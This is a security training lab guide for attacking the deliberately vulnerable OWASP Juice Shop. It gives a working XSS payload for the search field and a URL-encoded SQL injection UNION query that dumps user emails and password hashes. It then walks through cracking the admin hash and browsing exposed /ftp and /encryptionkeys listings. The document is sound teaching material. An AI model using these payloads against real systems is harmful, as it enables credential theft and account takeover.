Lab 3 – Hacking the Juice Shop
------------------------------

Objective
~~~~~~~~~

- Demonstrate the vulnerabilities in the Juice Shop web application.

- Demonstrate a cross site scripting (XSS) vulnerability.

- Demonstrate a SQL injection vulnerability.

- Demonstrate a privilege escalation vulnerability.

- Demonstrate an unauthorized directory listing.

Task – Demonstrate a cross site scripting (XSS) vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Click on the magnifying glass in the top right of the page to expose a search field and enter the following in the field and hit enter:

``<iframe src="javascript:alert(`pwned`)">``

You should see the following page load with a popup window

    .. image:: /_static/class9/juice_shop_xss.png


Task – Demonstrate a SQL injection vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copy and paste the following URI after the FQDN of the Juice Shop:


.. code-block:: none
   
    /rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--

The location bar should look something like this:

.. code-block:: none

    https://ba3eff45-2f23-49ab-8122-2e3bdc1ed9ad.access.udf.f5.com/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--

The result should be a list of all the users in the database including their hashed passwords.

    .. image:: /_static/class9/juice_shop_users.png


Task - Demonstrate a privilege escalation vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Use a rainbow lookup table to expose the admin user's password by navigating to https://crackstation.net/ and entering the hash


    .. image:: /_static/class9/juice_shop_crackstation.png


Task - Demonstrate an unauthorized directory listing
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Navigate to /ftp to expose an unwanted directory listing

    .. image:: /_static/class9/juice_shop_ftp.png

Navigate to /encryptionkeys to expose an unwanted directory listing

    .. image:: /_static/class9/juice_shop_encryptionkeys.png


